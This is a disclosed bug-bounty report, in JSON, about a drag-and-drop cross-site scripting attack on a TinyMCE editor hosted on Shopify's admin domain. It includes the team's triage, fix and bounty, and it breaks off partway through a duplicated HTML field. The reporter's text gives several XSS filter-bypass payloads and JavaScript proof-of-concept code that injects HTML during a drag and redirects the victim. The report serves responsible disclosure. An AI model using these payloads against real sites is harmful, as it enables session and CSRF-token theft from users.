{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-09-26T14:46:20.867Z", 
    "voters": [
        "flamezzz", 
        "sp1d3rs", 
        "bl4de", 
        "jensec", 
        "003random", 
        "bogdantcaciuc", 
        "encrypt", 
        "edoverflow", 
        "ducnt_", 
        "almroot", 
        "and 21 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "2000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 262230, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-09-25T20:51:47.418Z", 
    "vulnerability_information": "Hello,\n\nThe following url\n  * https://app.shopify.com//services/mobile_app/rte\n\nLoads https://cdn.shopify.com/s/assets/mobile_app/rte-bundle-f044a6c638b6c0500848c772dd5c86bf0eb2b27516c0860c6d3ddafde42231e2.js which is a minified tinymce 2.4.0.\n\nThis version of tinymce has known vulnerabilities but in order to trigger them the attacker needs access to tinymce's functionality. To achieve this I came up with a drag drop scenario which goes as follows:\n  * Attacker lures Shopify admin to controlled website\n  * Attacker convinces admin to drag element on the page which has an ondragstart prop with event.dataTransfer.setData+text/html mime (event.dataTransfer.setData('text/html', payload))\n  * Immediatly after the drag the attacker redirects the user to Shopify. This does not violate the XFO 'DENY' setting (https://app.shopify.com//services/mobile_app/rte)\n  * Victim releases the mouse button after loading the tinymce and the dragged data gets rendered by tinymce (tinymce is fullscreen so it doesn't matter where you drop it on the screen)\n\nWhile I couldn't get a tinymce XSS to trigger it does illustrate an attacker can make tinymce render something. Underneath are the vulnerabilities I tried with associated payload.\n\n[XSS through a href data url](https://github.com/cybersecurityworks/Disclosed/issues/10)\n\n```\n<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=\" target=\"_blank\">Firfox</a>\n```\n[Filter confusion 1](https://github.com/tinymce/tinymce/issues/3114)\n```\n'\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)>\n```\n[Filter confusion 2](https://hackerone.com/reports/81736) and [here](https://github.com/tinymce/tinymce/issues/2356)\n```\n<HTML xmlns: ><audio>\n<audio src=wp onerror=alert(0X1)>\n```\n[Filter confusion 3](https://github.com/tinymce/tinymce/issues/2132)\n```\n&ltg;?\">&ltg;iframe SRC=&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#39&#88&#83&#83&#39&#41>?>\n```\n\nWhile unable to create a proper PoC the availability of the vulnerable library presented in the way it is might be of your interest.\n\nHere is the poc:\n```\n<div draggable=\"true\" ondragstart=\"event.dataTransfer.setData('text/html', '<img src=\\'https://cdn.shopify.com/shopify-marketing_assets/static/shopify-favicon.png\\'/>'); document.location='https://app.shopify.com//services/mobile_app/rte'\">drag</div>\n```\nSave that as a html file, open with firefox, drag the div and release it after the page redirected. Tinymce will then render the favicon.\n\nConsidering the things that live under this subdomain + CSRF token handout on page successful exploitation of this could get pretty disastrous.", 
    "activity_page_count": 1, 
    "severity": {
        "metrics": {
            "confidentiality": "high", 
            "privileges_required": "none", 
            "user_interaction": "required", 
            "attack_vector": "network", 
            "attack_complexity": "high", 
            "scope": "unchanged", 
            "integrity": "high", 
            "availability": "none"
        }, 
        "rating": "medium", 
        "score": 4.8, 
        "author_type": "Team"
    }, 
    "title": "Tinymce 2.4.0", 
    "is_member_of_team?": null, 
    "vote_count": 31, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": {
        "asset_identifier": "apps.shopify.com", 
        "max_severity": "medium", 
        "databaseId": 418, 
        "asset_type": "URL"
    }, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$2,000", 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-08-22T14:43:53.381Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-22T14:43:53.381Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Thank you for your report.\n\nCould you provide us with a concrete, plausible exploitation scenario that doesn't involve social engineering?", 
            "markdown_message": "<p>Thank you for your report.</p>\n\n<p>Could you provide us with a concrete, plausible exploitation scenario that doesn&#39;t involve social engineering?</p>\n", 
            "type": "Activities::BugNeedsMoreInfo", 
            "id": 1946385, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/215/030/23d6a43a96dedd44e6a602c98de12daf530a9a9b/demo.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6DOF4BH7%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223217Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDAsIeiAo1xTw4kIWniK3AwV1z%2FDNuc2GpLi7AJOEJ0e4NWAql7yl6ReQj30YP2K5FBrc9xv0H8z3PZE4N7C099Z%2FTC7v7C1gzo54Jgi%2FX3cl%2B1K8PJ1QoShLHpAAjRjf5ciIakpyJZtfax9fUrlrfbg93561WLH%2BcAlYZYP%2FDoT4YEiEnKFoc6r1kz0vtgQeOMs4HdHNkjkFGMI77%2BHQkyTCbcJv5zS%2BkPk%2FmeIs5TPwLonNR3KC9vVtG8%2FxH87F2PEClO9BEdrskZjtMWY6P010JBQmt1CorTu4hj%2BXFqvR%2F690HP1hcC8CWJCyppmtZv0XEClGLMVyC6ib3jbvYHrbrPEHfmQP2RQi0FwMeueNkOH5qbyGqwmmxB4agSDiXM3XAl%2BTc87Wf5p1e%2Bc0zjzZ0xQeKM%2F%2B6b6TparaVSEWnYgYleztcjU3fPWHAZNwL16PwqewCVGh0Qp%2BPnUemfdihk3MmFQeIjHmE7sOQgXva7HlIEEEJ1hyrapkEutFP16gxCQzYqmfLGEsK0wbCxHgen0YqfDv81EZR726krPSisHScLMujI0SnwbcN8IyUwIYqnw663l%2FY9Dhpcje1uM19tGvbMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6b7c2d2ffc03198e4f74215b4a1565467639ee5edd4cade6e41a4606603feae0", 
                    "type": "video/mp4", 
                    "id": 215030, 
                    "filename": "demo.mp4"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/215/029/6170834c1d67078815a52788358c6f05baa28575/exploit.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6DOF4BH7%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223217Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDAsIeiAo1xTw4kIWniK3AwV1z%2FDNuc2GpLi7AJOEJ0e4NWAql7yl6ReQj30YP2K5FBrc9xv0H8z3PZE4N7C099Z%2FTC7v7C1gzo54Jgi%2FX3cl%2B1K8PJ1QoShLHpAAjRjf5ciIakpyJZtfax9fUrlrfbg93561WLH%2BcAlYZYP%2FDoT4YEiEnKFoc6r1kz0vtgQeOMs4HdHNkjkFGMI77%2BHQkyTCbcJv5zS%2BkPk%2FmeIs5TPwLonNR3KC9vVtG8%2FxH87F2PEClO9BEdrskZjtMWY6P010JBQmt1CorTu4hj%2BXFqvR%2F690HP1hcC8CWJCyppmtZv0XEClGLMVyC6ib3jbvYHrbrPEHfmQP2RQi0FwMeueNkOH5qbyGqwmmxB4agSDiXM3XAl%2BTc87Wf5p1e%2Bc0zjzZ0xQeKM%2F%2B6b6TparaVSEWnYgYleztcjU3fPWHAZNwL16PwqewCVGh0Qp%2BPnUemfdihk3MmFQeIjHmE7sOQgXva7HlIEEEJ1hyrapkEutFP16gxCQzYqmfLGEsK0wbCxHgen0YqfDv81EZR726krPSisHScLMujI0SnwbcN8IyUwIYqnw663l%2FY9Dhpcje1uM19tGvbMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=260a15415bca31e1c47a34c15b4173c6e91a240a3efd78a8bdb3a27709bca4fa", 
                    "type": "text/html", 
                    "id": 215029, 
                    "filename": "exploit.html"
                }
            ], 
            "automated_response": false, 
            "created_at": "2017-08-22T23:34:16.836Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-22T23:34:16.836Z", 
            "actor": {
                "username": "jelmer", 
                "url": "/jelmer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/636/f409a32cbb16f6a9253d020c6c0b5ba4b1c5846c_medium.jpg?1527112184"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Hi Clayton,\n\nThanks for your timely response, you made me explore that rabbit hole pretty thoroughly but I finally got it!\n\nTinymce was more recent than initially estimated. It's version 4.3.something and no working XSS could be found.\n\nIn Firefox it is possible to drag multiple items at once. When for example text is selected and the dragstart event is dispatched, both items will be present in the event.dataTransfer. This confused tinymce.\nThis combined with a video onloadstart followed by a source element to trick the browser to load & dispatch the event will trigger a XSS.\n\nTo select the text of an element automatically in JavaScript we do the following.\n```\n  var selection = window.getSelection();\n  var range = document.createRange();\n  range.selectNodeContents(document.getElementById(\"drag\"));\n  selection.removeAllRanges();\n  selection.addRange(range);\n\n```\n\nAnd adding an event for dragstart would look like this:\n\n```\n        el.addEventListener(\"dragstart\", function(ev){\n                ev.dataTransfer.setData('text/html', '<video onloadstart=\"document.write(/xss/)\"><source/>');\n                document.location='https://app.shopify.com//services/mobile_app/rte';\n        });\n```\n\nThe idea is that the victim will drag and release the video element while having the text selected essentially dragging 2 objects at once.\n\nSince the font must be dragged I made it huge & auto select it.\n\nThere is preloading going on in the background already from the beginning. This to smoothen the transition from dragstart to drop. The app.shopify.com target must be fully loaded before the mouse button is released. I managed to bring that process down to quite a bit.\n\nThe payload is automatically encoded just to make things easier.\n\nX-Frame-Options is set to 'DENY'. This doesn't matter because we do a document.location change && drop.\n\nI know that there is privileged functionality on this domain. Only the CSRF token is required to make requests to that location.", 
            "markdown_message": "<p>Hi Clayton,</p>\n\n<p>Thanks for your timely response, you made me explore that rabbit hole pretty thoroughly but I finally got it!</p>\n\n<p>Tinymce was more recent than initially estimated. It&#39;s version 4.3.something and no working XSS could be found.</p>\n\n<p>In Firefox it is possible to drag multiple items at once. When for example text is selected and the dragstart event is dispatched, both items will be present in the event.dataTransfer. This confused tinymce.<br>\nThis combined with a video onloadstart followed by a source element to trick the browser to load &amp; dispatch the event will trigger a XSS.</p>\n\n<p>To select the text of an element automatically in JavaScript we do the following.</p>\n<pre class=\"highlight plaintext\"><code>  var selection = window.getSelection();\n  var range = document.createRange();\n  range.selectNodeContents(document.getElementById(&quot;drag&quot;));\n  selection.removeAllRanges();\n  selection.addRange(range);\n\n</code></pre>\n<p>And adding an event for dragstart would look like this:</p>\n<pre class=\"highlight plaintext\"><code>        el.addEventListener(&quot;dragstart&quot;, function(ev){\n                ev.dataTransfer.setData(&#39;text/html&#39;, &#39;&lt;video onloadstart=&quot;document.write(/xss/)&quot;&gt;&lt;source/&gt;&#39;);\n                document.location=&#39;https://app.shopify.com//services/mobile_app/rte&#39;;\n        });\n</code></pre>\n<p>The idea is that the victim will drag and release the video element while having the text selected essentially dragging 2 objects at once.</p>\n\n<p>Since the font must be dragged I made it huge &amp; auto select it.</p>\n\n<p>There is preloading going on in the background already from the beginning. This to smoothen the transition from dragstart to drop. The app.shopify.com target must be fully loaded before the mouse button is released. I managed to bring that process down to quite a bit.</p>\n\n<p>The payload is automatically encoded just to make things easier.</p>\n\n<p>X-Frame-Options is set to &#39;DENY&#39;. This doesn&#39;t matter because we do a document.location change &amp;&amp; drop.</p>\n\n<p>I know that there is privileged functionality on this domain. Only the CSRF token is required to make requests to that location.</p>\n", 
            "type": "Activities::BugNew", 
            "id": 1947426, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-23T16:37:04.274Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-23T16:37:04.274Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "@jelmer Thanks for taking the time to improve your proof of concept. We were able to reproduce the issue, and our engineering team is investigating a fix.", 
            "markdown_message": "<p><a href=\"/jelmer\">@jelmer</a> Thanks for taking the time to improve your proof of concept. We were able to reproduce the issue, and our engineering team is investigating a fix.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 1949349, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-24T09:08:46.589Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-24T09:08:46.589Z", 
            "actor": {
                "username": "jelmer", 
                "url": "/jelmer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/636/f409a32cbb16f6a9253d020c6c0b5ba4b1c5846c_medium.jpg?1527112184"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "My pleasure. Maybe it's worth looking into hosting [this](https://app.shopify.com//services/mobile_app/rte) on cdn.shopify.com as well. The js/css already come from there. Another idea would be to harden tinymce by [disallowing pasting data images](https://www.tinymce.com/docs/plugins/paste/#paste_data_images), that will also prevent drag/dropping images (not sure if this includes other media). Including it in your patch cycle should keep it up-to-date however considering tinymce's history there should still be some XSSes sleeping in there.", 
            "markdown_message": "<p>My pleasure. Maybe it&#39;s worth looking into hosting <a href=\"/redirect?signature=cd00e73886e5f7858d85698531a8e994d9d48ea8&amp;url=https%3A%2F%2Fapp.shopify.com%2F%2Fservices%2Fmobile_app%2Frte\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>this</span><i class=\"icon-external-link\"></i></a> on cdn.shopify.com as well. The js/css already come from there. Another idea would be to harden tinymce by <a href=\"/redirect?signature=5eb037871f1fb89528a9324c389acab9f82a1ae0&amp;url=https%3A%2F%2Fwww.tinymce.com%2Fdocs%2Fplugins%2Fpaste%2F%23paste_data_images\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>disallowing pasting data images</span><i class=\"icon-external-link\"></i></a>, that will also prevent drag/dropping images (not sure if this includes other media). Including it in your patch cycle should keep it up-to-date however considering tinymce&#39;s history there should still be some XSSes sleeping in there.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1951204, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-24T12:45:16.454Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-24T12:45:16.454Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "> Maybe it's worth looking into hosting this on cdn.shopify.com as well.\n\nYes, that's what we were planning to do. We'll get back to you as this progresses.", 
            "markdown_message": "<blockquote>\n<p>Maybe it&#39;s worth looking into hosting this on cdn.shopify.com as well.</p>\n</blockquote>\n\n<p>Yes, that&#39;s what we were planning to do. We&#39;ll get back to you as this progresses.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1951924, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "jelmer", 
                "url": "/jelmer"
            }, 
            "created_at": "2017-09-25T17:51:29.799Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-25T17:51:29.799Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Thanks again for your report. We've resolved the issue by moving the rich text editor from app.shopify.com to cdn.shopify.com, as discussed previously.\n\nOur next round of bounty decisions will take place later this week, so we'll be in touch with you again soon.", 
            "markdown_message": "<p>Thanks again for your report. We&#39;ve resolved the issue by moving the rich text editor from app.shopify.com to cdn.shopify.com, as discussed previously.</p>\n\n<p>Our next round of bounty decisions will take place later this week, so we&#39;ll be in touch with you again soon.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 2021715, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-09-25T20:51:31.121Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-25T20:51:31.121Z", 
            "actor": {
                "url": "/shopify", 
                "profile": {
                    "name": "Shopify"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
                }
            }, 
            "team_handle": "shopify", 
            "bonus_amount": "0.0", 
            "bounty_amount": "2000.0", 
            "collaborator": {
                "username": "jelmer", 
                "url": "/jelmer"
            }, 
            "message": "We decided to award 2000$ in this case because it demonstrates a XSS on a high value domain, app.shopify.com which hosts the internal area of Shopify accessible only to employees. We appreciated that @jelmer took the time to write a proof of concept, because it demonstrated that TinyMCE was exploitable when we did not think an exploit was possible was at first glance.", 
            "markdown_message": "<p>We decided to award 2000$ in this case because it demonstrates a XSS on a high value domain, app.shopify.com which hosts the internal area of Shopify accessible only to employees. We appreciated that <a href=\"/jelmer\">@jelmer</a> took the time to write a proof of concept, because it demonstrated that TinyMCE was exploitable when we did not think an exploit was possible was at first glance.</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 2022542, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-25T20:51:47.445Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-25T20:51:47.445Z", 
            "actor": {
                "username": "francoischagnon", 
                "url": "/francoischagnon", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/168/3b5130025fbf90eaeb1c9234baa340dfead68f44_medium.jpg?1429126005"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2022544, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-26T14:26:37.367Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-26T14:26:37.367Z", 
            "actor": {
                "username": "shopify-peteryaworski", 
                "url": "/shopify-peteryaworski", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/175/526/540ca6d631d17896334275083b38566a86be2b2b_medium.jpg?1497551006"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "Medium", 
                "old_severity": "None"
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 2024304, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-26T14:36:13.040Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-26T14:36:13.040Z", 
            "actor": {
                "username": "jelmer", 
                "url": "/jelmer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/636/f409a32cbb16f6a9253d020c6c0b5ba4b1c5846c_medium.jpg?1527112184"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Thanks!", 
            "markdown_message": "<p>Thanks!</p>\n", 
            "type": "Activities::Comment", 
            "id": 2024329, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-26T14:46:20.891Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-26T14:46:20.891Z", 
            "actor": {
                "username": "jelmer", 
                "url": "/jelmer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/636/f409a32cbb16f6a9253d020c6c0b5ba4b1c5846c_medium.jpg?1527112184"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2024362, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-26T14:46:20.961Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-26T14:46:20.961Z", 
            "actor": {
                "username": "jelmer", 
                "url": "/jelmer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/636/f409a32cbb16f6a9253d020c6c0b5ba4b1c5846c_medium.jpg?1527112184"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 2024363, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-06-15T18:51:40.066Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-15T18:51:40.066Z", 
            "actor": {
                "username": "shopify-peteryaworski", 
                "url": "/shopify-peteryaworski", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/175/526/540ca6d631d17896334275083b38566a86be2b2b_medium.jpg?1497551006"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "added_weaknesses": [
                    {
                        "id": 61, 
                        "name": "Cross-site Scripting (XSS) - Reflected"
                    }
                ], 
                "removed_weaknesses": [
                    {
                        "id": 57, 
                        "name": "Violation of Secure Design Principles"
                    }
                ]
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportVulnerabilityTypesUpdated", 
            "id": 2890027, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-06-15T18:51:52.253Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-15T18:51:52.253Z", 
            "actor": {
                "username": "shopify-peteryaworski", 
                "url": "/shopify-peteryaworski", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/175/526/540ca6d631d17896334275083b38566a86be2b2b_medium.jpg?1497551006"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "added_weaknesses": [
                    {
                        "id": 63, 
                        "name": "Cross-site Scripting (XSS) - DOM"
                    }
                ], 
                "removed_weaknesses": [
                    {
                        "id": 61, 
                        "name": "Cross-site Scripting (XSS) - Reflected"
                    }
                ]
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportVulnerabilityTypesUpdated", 
            "id": 2890028, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-06-15T18:52:23.326Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-15T18:52:23.326Z", 
            "actor": {
                "username": "shopify-peteryaworski", 
                "url": "/shopify-peteryaworski", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/175/526/540ca6d631d17896334275083b38566a86be2b2b_medium.jpg?1497551006"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "Medium (4.2)", 
                "old_severity": "Medium"
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 2890029, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-06-15T18:52:53.077Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-15T18:52:53.077Z", 
            "actor": {
                "username": "shopify-peteryaworski", 
                "url": "/shopify-peteryaworski", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/175/526/540ca6d631d17896334275083b38566a86be2b2b_medium.jpg?1497551006"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "Medium (4.8)", 
                "old_severity": "Medium (4.2)"
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 2890032, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "jelmer", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/jelmer", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/012/636/425d501228f0b6c000136257594ad0a829d84996_small.jpg?1527112184"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 63, 
        "name": "Cross-site Scripting (XSS) - DOM"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2017-09-26T14:46:20.938Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/262230", 
    "created_at": "2017-08-22T14:25:51.537Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hello,</p>\n\n<p>The following url</p>\n\n<ul>\n<li><a title=\"https://app.shopify.com//services/mobile_app/rte\" href=\"/redirect?signature=cd00e73886e5f7858d85698531a8e994d9d48ea8&amp;url=https%3A%2F%2Fapp.shopify.com%2F%2Fservices%2Fmobile_app%2Frte\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://app.shopify.com//services/mobile_app/rte</span><i class=\"icon-external-link\"></i></a></li>\n</ul>\n\n<p>Loads <a title=\"https://cdn.shopify.com/s/assets/mobile_app/rte-bundle-f044a6c638b6c0500848c772dd5c86bf0eb2b27516c0860c6d3ddafde42231e2.js\" href=\"/redirect?signature=ddeb62eeef770e9da874594d5c813c2a9cab5ac9&amp;url=https%3A%2F%2Fcdn.shopify.com%2Fs%2Fassets%2Fmobile_app%2Frte-bundle-f044a6c638b6c0500848c772dd5c86bf0eb2b27516c0860c6d3ddafde42231e2.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://cdn.shopify.com/s/assets/mobile_app/rte-bundle-f044a6c638b6c0500848c772dd5c86bf0eb2b27516c0860c6d3ddafde42231e2.js</span><i class=\"icon-external-link\"></i></a> which is a minified tinymce 2.4.0.</p>\n\n<p>This version of tinymce has known vulnerabilities but in order to trigger them the attacker needs access to tinymce&#39;s functionality. To achieve this I came up with a drag drop scenario which goes as follows:</p>\n\n<ul>\n<li>Attacker lures Shopify admin to controlled website</li>\n<li>Attacker convinces admin to drag element on the page which has an ondragstart prop with event.dataTransfer.setData+text/html mime (event.dataTransfer.setData(&#39;text/html&#39;, payload))</li>\n<li>Immediatly after the drag the attacker redirects the user to Shopify. This does not violate the XFO &#39;DENY&#39; setting (<a title=\"https://app.shopify.com//services/mobile_app/rte\" href=\"/redirect?signature=cd00e73886e5f7858d85698531a8e994d9d48ea8&amp;url=https%3A%2F%2Fapp.shopify.com%2F%2Fservices%2Fmobile_app%2Frte\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://app.shopify.com//services/mobile_app/rte</span><i class=\"icon-external-link\"></i></a>)</li>\n<li>Victim releases the mouse button after loading the tinymce and the dragged data gets rendered by tinymce (tinymce is fullscreen so it doesn&#39;t matter where you drop it on the screen)</li>\n</ul>\n\n<p>While I couldn&#39;t get a tinymce XSS to trigger it does illustrate an attacker can make tinymce render something. Underneath are the vulnerabilities I tried with associated payload.</p>\n\n<p><a href=\"/redirect?signature=125870d337477895a17a222ab261e19016fbe4f0&amp;url=https%3A%2F%2Fgithub.com%2Fcybersecurityworks%2FDisclosed%2Fissues%2F10\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>XSS through a href data url</span><i class=\"icon-external-link\"></i></a></p>\n<pre class=\"highlight plaintext\"><code>&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=&quot; 